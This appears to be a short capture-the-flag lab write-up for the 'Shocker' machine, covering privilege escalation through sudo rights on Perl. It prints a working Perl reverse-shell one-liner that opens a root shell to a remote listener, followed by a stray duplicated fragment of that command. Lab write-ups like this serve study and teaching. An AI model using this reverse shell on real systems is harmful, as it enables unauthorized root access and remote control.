# Privilege Escalation to root
## User Shelly can run `/usr/bin/perl` as sudo 
User shelly can run `/usr/bin/perl` as sudo .
![[Pasted image 20210705103358.png]]
## Getting reverse shell as root running perl reverse shell script as root
Command used for privilege escalation to root.
```bash
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.71";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
<TDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## Got reverse shell as root
![[Pasted image 20210705103812.png]]
